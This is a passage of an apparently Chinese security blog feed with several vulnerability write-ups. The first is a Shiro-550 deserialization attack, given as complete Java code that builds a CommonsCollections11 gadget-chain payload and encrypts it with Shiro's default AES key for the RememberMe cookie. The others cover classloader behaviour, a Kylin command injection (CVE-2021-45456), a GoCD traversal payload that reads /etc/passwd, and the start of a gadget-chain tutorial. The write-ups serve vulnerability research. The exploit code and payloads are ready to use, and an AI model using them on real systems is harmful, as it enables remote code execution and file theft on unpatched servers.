class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.serialize;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> javassist.ClassClassPath;</span><br><span class="line"><span class="keyword">import</span> javassist.ClassPool;</span><br><span class="line"><span class="keyword">import</span> javassist.CtClass;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.FileInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.FileOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Created by dotast on 2022/10/12 15:50</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CommonsCollections11</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">CommonsCollections11</span> <span class="variable">commonsCollections11</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">CommonsCollections11</span>();</span><br><span class="line">        commonsCollections11.serialize();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">serialize</span><span class="params">()</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">cmd</span> <span class="operator">=</span> <span class="string">&quot;Runtime.getRuntime().exec(\&quot;open -a Calculator.app\&quot;);&quot;</span>;</span><br><span class="line">        <span class="comment">// 创建evailClass</span></span><br><span class="line">        <span class="type">ClassPool</span> <span class="variable">pool</span> <span class="operator">=</span> ClassPool.getDefault();</span><br><span class="line">        pool.insertClassPath(<span class="keyword">new</span> <span class="title class_">ClassClassPath</span>(AbstractTranslet.class));</span><br><span class="line">        <span class="type">CtClass</span> <span class="variable">evailClass</span> <span class="operator">=</span> pool.makeClass(<span class="string">&quot;evailClass&quot;</span>);</span><br><span class="line">        <span class="comment">// 将代码插进static&#123;&#125;</span></span><br><span class="line">        evailClass.makeClassInitializer().insertBefore(cmd);</span><br><span class="line">        evailClass.setSuperclass(pool.get(AbstractTranslet.class.getName()));</span><br><span class="line">        <span class="comment">// 转换成字节码</span></span><br><span class="line">        <span class="type">byte</span>[] classBytes = evailClass.toBytecode();</span><br><span class="line">        <span class="type">byte</span>[][] targetByteCodes = <span class="keyword">new</span> <span class="title class_">byte</span>[][]&#123;classBytes&#125;;</span><br><span class="line">        <span class="comment">// 反射修改</span></span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">templates</span> <span class="operator">=</span> TemplatesImpl.class.newInstance();</span><br><span class="line">        <span class="type">Field</span> <span class="variable">bytecodes</span> <span class="operator">=</span> templates.getClass().getDeclaredField(<span class="string">&quot;_bytecodes&quot;</span>);</span><br><span class="line">        bytecodes.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        bytecodes.set(templates, targetByteCodes);</span><br><span class="line"></span><br><span class="line">        <span class="type">Field</span> <span class="variable">name</span> <span class="operator">=</span> templates.getClass().getDeclaredField(<span class="string">&quot;_name&quot;</span>);</span><br><span class="line">        name.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        name.set(templates, <span class="string">&quot;name&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">Field</span> <span class="variable">_class</span> <span class="operator">=</span> templates.getClass().getDeclaredField(<span class="string">&quot;_class&quot;</span>);</span><br><span class="line">        _class.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        _class.set(templates, <span class="literal">null</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 创建恶意的调用链</span></span><br><span class="line">        <span class="type">InvokerTransformer</span> <span class="variable">invokerTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;toString&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">0</span>], <span class="keyword">new</span> <span class="title class_">Object</span>[<span class="number">0</span>]);</span><br><span class="line">        <span class="type">Map</span> <span class="variable">innerMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        <span class="type">Map</span> <span class="variable">outerMap</span> <span class="operator">=</span> LazyMap.decorate(innerMap, invokerTransformer);</span><br><span class="line">        <span class="comment">// 创建TiedMapEntry实例</span></span><br><span class="line">        <span class="type">TiedMapEntry</span> <span class="variable">tiedMapEntry</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TiedMapEntry</span>(outerMap,templates);</span><br><span class="line">        <span class="type">Map</span> <span class="variable">expMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        expMap.put(tiedMapEntry,<span class="string">&quot;valueTest&quot;</span>);</span><br><span class="line">        outerMap.remove(templates);</span><br><span class="line">        <span class="comment">// 通过反射修改iMethodName值为newTransformer</span></span><br><span class="line">        <span class="type">Field</span> <span class="variable">f</span> <span class="operator">=</span> invokerTransformer.getClass().getDeclaredField(<span class="string">&quot;iMethodName&quot;</span>);</span><br><span class="line">        f.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        f.set(invokerTransformer, <span class="string">&quot;newTransformer&quot;</span>);</span><br><span class="line">        <span class="type">FileOutputStream</span> <span class="variable">fileOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;1.txt&quot;</span>);</span><br><span class="line">        <span class="comment">// 创建并实例化对象输出流</span></span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">out</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(fileOutputStream);</span><br><span class="line">        out.writeObject(expMap);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>根据对应的<code>AbstractRememberMeManager#encrypt()</code>方法编写加密<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.shiro;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xerces.internal.impl.dv.util.Base64;</span><br><span class="line"><span class="keyword">import</span> org.apache.shiro.crypto.AesCipherService;</span><br><span class="line"><span class="keyword">import</span> org.apache.shiro.util.ByteSource;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.FileInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.InputStream;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Created by dotast on 2022/10/10 10:45</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Shiro550</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">path</span> <span class="operator">=</span> <span class="string">&quot;1.txt&quot;</span>;</span><br><span class="line">        <span class="type">byte</span>[] key = Base64.decode(<span class="string">&quot;kPH+bIxk5D2deZiIxcaaaA==&quot;</span>);</span><br><span class="line">        <span class="type">AesCipherService</span> <span class="variable">aes</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">AesCipherService</span>();</span><br><span class="line">        <span class="type">ByteSource</span> <span class="variable">ciphertext</span> <span class="operator">=</span> aes.encrypt(getBytes(path), key);</span><br><span class="line">        System.out.printf(ciphertext.toString());</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="type">byte</span>[] getBytes(String path) <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">InputStream</span> <span class="variable">inputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileInputStream</span>(path);</span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">byteArrayOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        <span class="type">int</span> <span class="variable">n</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">while</span> ((n=inputStream.read())!=-<span class="number">1</span>)&#123;</span><br><span class="line">            byteArrayOutputStream.write(n);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">byte</span>[] bytes = byteArrayOutputStream.toByteArray();</span><br><span class="line">        <span class="keyword">return</span> bytes;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>运行后获得构造的恶意<code>RememberMe</code>字段内容，添加到 Cookie 中发送请求，成功弹出计算器。<br><img src="images/image-20221018164755328.png" alt="image-20221018164755328"></p><h2 id="Shiro-与-CC6"><a href="#Shiro-与-CC6" class="headerlink" title="Shiro 与 CC6"></a>Shiro 与 CC6</h2><p>在<code>Commons-Collections11</code>的时候曾提过<code>Commons-Collections6</code>这条链子在 shiro 中使用会报错，但如果你用<code>Commons-Collections6</code>生成的 POC 在我上面搭的环境会发现依然能正常弹出计算器，并没有出现报错，这是为什么呢？</p><p>在上述环境使用的依赖是<code>shiro-spring</code>，也就是用 Spring-boot 构建的 Shiro<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;dependency&gt;</span><br><span class="line">            &lt;groupId&gt;org.apache.shiro&lt;/groupId&gt;</span><br><span class="line">            &lt;artifactId&gt;shiro-spring&lt;/artifactId&gt;</span><br><span class="line">            &lt;version&gt;1.2.4&lt;/version&gt;</span><br><span class="line">&lt;/dependency&gt;</span><br></pre></td></tr></table></figure></p><p>Shiro 的原生依赖只用到了：<code>shiro-core</code>和<code>shiro-web</code>，那么<code>Spring</code>构建的<code>Shiro</code>和原生的<code>Shiro</code>有什么不同呢？</p><p>我们使用原生环境调调看，这里直接去 Shiro 的仓库下载，然后修改一下 pom.xml 文件即可，下面用到的环境也上传到前面提到的 github 仓库了。运行后访问主页，使用<code>CommonCollections6</code>的 POC 发送请求<br><img src="images/image-20221020003021727.png" alt="image-20221020003021727"></p><p>并没有弹出计算器，再回来看看 idea<br><img src="images/image-20221020003046360.png" alt="image-20221020003046360"></p><p>报错了，具体错误如下：<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Caused by: org.apache.shiro.util.UnknownClassException: Unable to load class named [[Lorg.apache.commons.collections.Transformer;] from the thread context, current, or system/application ClassLoaders.  All heuristics have been exhausted.  Class could not be found.</span><br></pre></td></tr></table></figure></p><p>翻译过来大体意思就是<code>Transformer</code>类找不到，我们跟一下反序列化的入口点看看<br><img src="images/image-20221020112505932.png" alt="image-20221020112505932"></p><p>这里可以看到最后用的是<code>ClassResolvingObjectInputStream</code>类返回输入流，而不是常规的<code>ObjectInputStream</code>类，跟进该类<br><img src="images/image-20221020112940956.png" alt="image-20221020112940956"></p><p>在<code>ClassResolvingObjectInputStream</code>类中继承了<code>ObjectInputStream</code>类并且重写了<code>resolveClass()</code>方法，跟进<code>ClassUtils.forName()方法</code><img src="images/image-20221020113104243.png" alt="image-20221020113104243"><br>又继续调用了<code>loadClass()</code>方法，其中参数值为<code>[Lorg.apache.commons.collections.Transformer;</code></p><p>这里的格式是<code>JNI</code>字段描述符，<code>[</code>表示数组，<code>L</code>代表类描述符，<code>;</code>表示类名到这里结束。</p><p>接着继续跟进<code>loadClass()</code>方法<br><img src="images/image-20221020113425888.png" alt="image-20221020113425888"></p><p>可以看到这里调用的<code>ClassLoader</code>为<code>ParallerWebappClassLoader</code>，接着到<code>loadClass()</code>方法，这里接着跟进需要添加 tomcat 的源码才能继续进行调试（这里是偷懒做法，如果想食用更佳，移步<a href="../../环境&amp;其他/Tomcat源码调试/Tomcat源码调试.md">Tomcat源码调试</a>）<br><img src="images/image-20221020113701346.png" alt="image-20221020113701346"></p><p>导入 tomcat 的 jar 包之后继续跟进<code>loadClass()</code>方法进入到了<code>WebappClassLoaderBase#loadClass()</code><br><img src="images/image-20221020113737475.png" alt="image-20221020113737475"></p><p>玩下走到<code>findLoadedClass0()</code>方法<br><img src="images/image-20221021234307342.png" alt="image-20221021234307342"></p><p><code>findLoadedClass0()</code>方法去缓存中查找是否存在，从跟的结果上得到是不存在，继续往下走到<code>this.findLoadedClass()</code>方法<br><img src="images/image-20221022160745842.png" alt="image-20221022160745842"></p><p>依然为null，后面的跟着几个方法都是为 null，我们略去，到最后一步关键处，也就是到了<code>Class.forName()</code>方法<br><img src="images/image-20221020113936096.png" alt="image-20221020113936096"></p><p>这里可以看到，此时的父加载器为<code>URLClassLoader</code><br><img src="images/image-20221020114136052.png" alt="image-20221020114136052"></p><p>其中<code>ucp</code>是<code>URLClassLoader</code>类的字段，<code>ucp</code>的成员<code>path</code>是一个 ArrayList 对象，存储着类的搜索路径。而这里这些路径全都是 tomcat 下的 lib 目录文件，并没有<code>commons-collections</code>的依赖文件。</p><p>下面贴上在<code>Class.forName()</code>方法后的 debug 过程视频（因为写成文字描述过于繁琐就贴上视频）</p><p><a href="https://user-images.githubusercontent.com/72428049/197333910-de821106-9403-4708-9f25-6604bff13485.mp4">https://user-images.githubusercontent.com/72428049/197333910-de821106-9403-4708-9f25-6604bff13485.mp4</a></p><p>在 debug 视频中可以看到，传进<code>Class.forName()</code>方法的参数 name 为<code>[Lorg.apache.commons.collections.Transformer;</code>，接着后面走到<code>findLoadedClass()</code>方法时还原成了正常的<code>org.apache.commons.collections.Transformer</code>，因此有些文章在跟到前面时就断定是先前的<code>[Lorgxxx</code>格式导致无法找到的结论并不准确，这并不是最终过程。</p><p>此外，可以看到<code>ClassLoader</code>的加载过程为<code>AppClassLoader</code> —&gt; <code>ExtClassLoader</code> —&gt; <code>BootstrapClassLoa·der</code>，均搜索不到<code>org.apache.commons.collections.Transformer</code>。</p><p>搜索不到后抛出<code>ClassNotFoundException</code>的异常<br><img src="images/image-20221020114557155.png" alt="image-20221020114557155"></p><p><img src="images/image-20221020114634262.png" alt="image-20221020114634262"></p><p>因此和之前的报错对应上了，那么为什么 spring 构建的 shiro 没有报错正常弹出计算器了呢？</p><p>我们继续调试一下<br><img src="images/image-20221020114824559.png" alt="image-20221020114824559"></p><p>在该环境中，加载的<code>ClassLoader</code>为<code>TomcatEmbeddedWebappClassLoader</code>，而不是之前 shiro 原生环境的<code>ParallerWebappClassLoader</code>。</p><p>继续跟进<code>loadClass()</code>方法，跳到了<code>TomcatEmbeddedWebappClassLoader#loadClass()</code>方法<br><img src="images/image-20221020115032790.png" alt="image-20221020115032790"></p><p>继续往下走，直到<code>Class.forName()</code>方法<br><img src="images/image-20221020115153447.png" alt="image-20221020115153447"></p><p>可以看到此时的父加载器为<code>AppClassLoader</code>系统类加载器，再看看此时的 path<br><img src="images/image-20221020115615209.png" alt="image-20221020115615209"></p><p>此时的 path 不再是 tomcat 下的，而是 java 环境中的，包含了<code>commons-collections</code>依赖，因此可以成功加载到<br><img src="images/image-20221020115831830.png" alt="image-20221020115831830"></p><p>这也解释了为什么在 spring 构建的 Shiro 环境中<code>Commons-Collections6</code>可以打成功，而原生的 Shiro 环境却报错失败的情况。</p><p>至于为什么 path 会不一样，父类加载器也不一样，尝试跟了一下，实在过于复杂，遂暂时放弃，调试到此。</p><p>等哪一天知识储备足够了，再来解惑。</p><h2 id="漏洞修复"><a href="#漏洞修复" class="headerlink" title="漏洞修复"></a>漏洞修复</h2><p>在 Shiro 1.2.5 版本的更新中，用户需要手动配置 CipherKey，如果不设置，将会动态生成一个 CipherKey。但反序列化流程没有修改，这也是 Shiro 至今依然在各大 HW 演练中频繁出现的原因。</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>CVE-2021-45456 Apache Kylin 命令注入</title>
      <link href="/2022/11/10/CVE-2021-45456ApacheKylin%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%E5%88%86%E6%9E%90%E8%A1%A5%E5%85%85/"/>
      <url>/2022/11/10/CVE-2021-45456ApacheKylin%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%E5%88%86%E6%9E%90%E8%A1%A5%E5%85%85/</url>
      
        <content type="html"><![CDATA[<h1 id="CVE-2021-45456-Apache-Kylin-命令注入"><a href="#CVE-2021-45456-Apache-Kylin-命令注入" class="headerlink" title="CVE-2021-45456 Apache Kylin 命令注入"></a>CVE-2021-45456 Apache Kylin 命令注入</h1><blockquote><p>看着y4er师傅写的分析，第一次看有点懵逼，所以简单的补充一下。</p></blockquote><h2 id="补充分析"><a href="#补充分析" class="headerlink" title="补充分析"></a>补充分析</h2><p>首先漏洞点在该路由的 <strong>dumpProjectDiagnosisInfo</strong>方法中project可控。</p><p><img src="https://user-images.githubusercontent.com/63966847/149534592-9f600b83-9036-45f3-a9a9-c7bc2bae5e48.png" alt="image-20220114222208845"></p><p>跟着进去，可以看到<strong>runDiagnosisCLI</strong>方法之后正常执行命令并且project一直可控。所以非常有机会RCE了!</p><p><img src="https://user-images.githubusercontent.com/63966847/149534609-f5d94546-4965-4580-8d1f-bfcb054127c3.png" alt="image-20220114222316611"></p><p>唯一绕过就是不让 <strong>projectInstance</strong>为null，不然就throw抛异常。所以我们看看projectInstance得到如何获得。</p><p>首先通过 <strong>convertStringToBeAlphanumericUnderscore</strong>方法进行替换，输入 <strong>touch 123</strong>则替换之后就为 <strong>touch123</strong></p><p><img src="https://user-images.githubusercontent.com/63966847/149534631-abb945b7-2bce-4fbe-baa3-e7032f013124.png" alt="image-20220114222541519"></p><p>之后通过 <strong>getProject</strong>方法去找有没有 <strong>touch123</strong>这个项目。看下面是通过<strong>projectMap.get(projectName);</strong>去获得如果有就不会抛异常就成功命令执行。</p><p><img src="https://user-images.githubusercontent.com/63966847/149534653-e78ad090-416d-4ce6-ae15-1fed7012cbea.png" alt="image-20220114222809923"></p><p>所以我们在看看得到才什么类中获取，也就是去看 <strong>projectMap</strong>是指的那个类。</p><p><img src="https://user-images.githubusercontent.com/63966847/149534679-31cc4590-a299-4882-9bee-b8fd9789b776.png" alt="image-20220114222920990"></p><p>然后跟上ProjectInstance，则到了如下代码，可以看到setname进去，所以我们最开始需要setname进去和 <strong>touch123</strong>相同就可以了</p><p><img src="https://user-images.githubusercontent.com/63966847/149534692-aacfd561-fcc5-42ae-94c0-84c342f026be.png" alt="image-20220114223024834"></p><p>向上跟踪</p><p><img src="https://user-images.githubusercontent.com/63966847/149534717-bb589da3-01f3-4f5b-a81b-b62e23419bc9.png" alt="image-20220114223153636"></p><p>然后去跟踪 <strong>createProject</strong>方法，之后到了 <strong>saveProject</strong>方法</p><p><img src="https://user-images.githubusercontent.com/63966847/149534727-a5264b5f-6dce-496d-bccd-90e6e0b4e392.png" alt="image-20220114223350119"></p><p>可以看到传递的是json格式然后去获得name，并且通过isAlphanumericUnderscore判断了，但是如果执行命令肯定set进去的name是 <strong>tuoch123</strong>，巧的是 <strong>tuoch123</strong>刚刚好去绕过。</p><p><img src="https://user-images.githubusercontent.com/63966847/149534845-842825f1-95ee-4028-a70c-d7d63f9651d2.png" alt="image-20220114223924151"></p><p><img src="https://user-images.githubusercontent.com/63966847/149534827-4f56fa4c-6fb9-4a8f-bfd3-2b798e8ab042.png" alt="image-20220114223911294"></p><p>从而成功执行命令。</p><h2 id="演示"><a href="#演示" class="headerlink" title="演示"></a>演示</h2><p>y4er师傅的图</p><p>先创建项目名</p><p><img src="https://user-images.githubusercontent.com/63966847/149534861-95093753-4e7f-4b8d-a552-7218ac5ce038.png" alt="image-20220114224040087"></p><p>执行命令</p><p><img src="https://user-images.githubusercontent.com/63966847/149534871-c0d29304-c9ca-43b5-b2ac-6abae59abe52.png" alt="image-20220114224119476"></p><h2 id="修复"><a href="#修复" class="headerlink" title="修复"></a>修复</h2><p><img src="https://user-images.githubusercontent.com/63966847/149534884-ff61e395-b5bc-4c97-94a3-3f07b3105f53.png" alt="image-20220114224356250"></p><p>传入cmd的参数改为projectName而非http传入的project，projectName经过convertStringToBeAlphanumericUnderscore() 处理，所以无法输入非字母数字下划线的字符来触发命令执行。</p><p>(除非单个命令可以创成严重危害。。。。。</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>CVE 2021 43287</title>
      <link href="/2022/11/10/CVE-2021-43287/"/>
      <url>/2022/11/10/CVE-2021-43287/</url>
      
        <content type="html"><![CDATA[<h1 id="CVE-2021-43287"><a href="#CVE-2021-43287" class="headerlink" title="CVE 2021 43287"></a>CVE 2021 43287</h1><blockquote><p>GoCD 一款先进的持续集成和发布管理系统,由ThoughtWorks开发。（不要和Google的编程语言Go混淆了！）其前身为CruiseControl,是ThoughtWorks在做咨询和交付交付项目时自己开发的一款开源的持续集成工具。后来随着持续集成及持续部署的火热，ThoughtWorks专门成立了一个项目组，基于Cruise开发除了Go这款工具。ThoughtWorks开源持续交付工具Go。使用Go来建立起一个项目的持续部署pipeline是非常快的，非常方便。 GoCD的v20.6.0 - v21.2.0版本存在任意文件读取漏洞，可以通过/go/add-on/business-continuity/api/plugin?folderName=&amp;pluginName=../../../etc/passwd 对文件进行读取。</p></blockquote><h2 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">v20.6.0 - v21.2.0</span><br></pre></td></tr></table></figure><h2 id="漏洞点"><a href="#漏洞点" class="headerlink" title="漏洞点"></a>漏洞点</h2><p><img src="https://user-images.githubusercontent.com/63966847/149621578-1249eeb8-f454-48ac-8edc-c5385a69661d.png" alt="image-20220115201323862"></p><h2 id="演示"><a href="#演示" class="headerlink" title="演示"></a>演示</h2><p><img src="https://user-images.githubusercontent.com/63966847/149621580-174d710e-5900-4860-b877-6a67f115c13c.png" alt="image-20220115201231569"></p><h2 id="修复"><a href="#修复" class="headerlink" title="修复"></a>修复</h2><p><a href="https://github.com/gocd/gocd/commit/41abc210ac4e8cfa184483c9ff1c0cc04fb3511c#diff-cc02ae4dc975bd7648bbbff5f5a2d98867674a767acc35c99d4cfd4d5a6fe488">https://github.com/gocd/gocd/commit/41abc210ac4e8cfa184483c9ff1c0cc04fb3511c#diff-cc02ae4dc975bd7648bbbff5f5a2d98867674a767acc35c99d4cfd4d5a6fe488</a></p><p><img src="https://user-images.githubusercontent.com/63966847/149621583-5334295f-a207-4da9-b5ad-1182bacf76d2.png" alt="image-20220115201143857"></p><p>删除了路由。</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>CommonsCollection利用链</title>
      <link href="/2022/11/10/CommonsCollections/"/>
      <url>/2022/11/10/CommonsCollections/</url>
      
        <content type="html"><![CDATA[<h1 id="CommonsCollections利用链"><a href="#CommonsCollections利用链" class="headerlink" title="CommonsCollections利用链"></a>CommonsCollections利用链</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p><code>Apache Commons</code>是<code>Apache</code>开源的Java通用类项目在Java中项目中被广泛的使用，<code>Apache Commons</code>当中有一个组件叫做<code>Apache Commons Collections</code>，主要封装了Java的<code>Collection（集合）</code>相关类对象。</p><p>在<code>Commons Collections</code>中实现了一个<code>TransformedMap类</code>，该类是对 Java 标准数据结构类型<code>Map</code>接口的一个扩展。该类可以在一个元素被加入到集合内时，自动对该元素进行特定的修饰变化，而具体的变换逻辑则由<code>Transformer</code>类定义，<code>Transformer</code>在<code>TransformedMap</code>实例化时作为参数传入。</p><p>本条链子的利用版本限制：<code>CommonsCollections 3.1 - 3.2.1</code></p><h2 id="接口类和实现类"><a href="#接口类和实现类" class="headerlink" title="接口类和实现类"></a>接口类和实现类</h2><h3 id="Transformer"><a href="#Transformer" class="headerlink" title="Transformer"></a>Transformer</h3><p><code>Transformer</code>是一个接口类，其功能是提供一个对象转换方法<code>transform</code>，源码如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">Transformer</span> &#123;</span><br><span class="line">  <span class="comment">// 将输入对象保持不变的转换为某个输出对象</span></span><br><span class="line">    Object <span class="title function_">transform</span><span class="params">(Object var1)</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>实现<code>Transformer</code>接口的类有以下类<br><img src="images/image-20220830225100395.png" alt="image-20220830225100395"></p><p>其中一些实现和调用<code>Transformer</code>接口的重要类为：<code>ConstantTransformer</code>、<code>invokerTransformer</code>、<code>ChainedTransformer</code>和<code>TransformedMap</code>。</p><h3 id="ConstantTransformer"><a href="#ConstantTransformer" class="headerlink" title="ConstantTransformer"></a>ConstantTransformer</h3><p><code>ConstantTransformer</code>类是<code>Transformer</code>接口其中的一个实现类，<code>ConstantTransformer</code>类重写了<code>transformer</code>方法，源码如下</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ConstantTransformer</span> <span class="keyword">implements</span> <span class="title class_">Transformer</span>, Serializable &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">long</span> <span class="variable">serialVersionUID</span> <span class="operator">=</span> <span class="number">6374440726369055124L</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">Transformer</span> <span class="variable">NULL_INSTANCE</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>((Object)<span class="literal">null</span>);</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> Object iConstant;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Transformer <span class="title function_">getInstance</span><span class="params">(Object constantToReturn)</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> (Transformer)(constantToReturn == <span class="literal">null</span> ? NULL_INSTANCE : <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(constantToReturn));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">ConstantTransformer</span><span class="params">(Object constantToReturn)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.iConstant = constantToReturn;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> Object <span class="title function_">transform</span><span class="params">(Object input)</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">this</span>.iConstant;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> Object <span class="title function_">getConstant</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">this</span>.iConstant;</span><br><span class="line">    &#125;</span><br><span 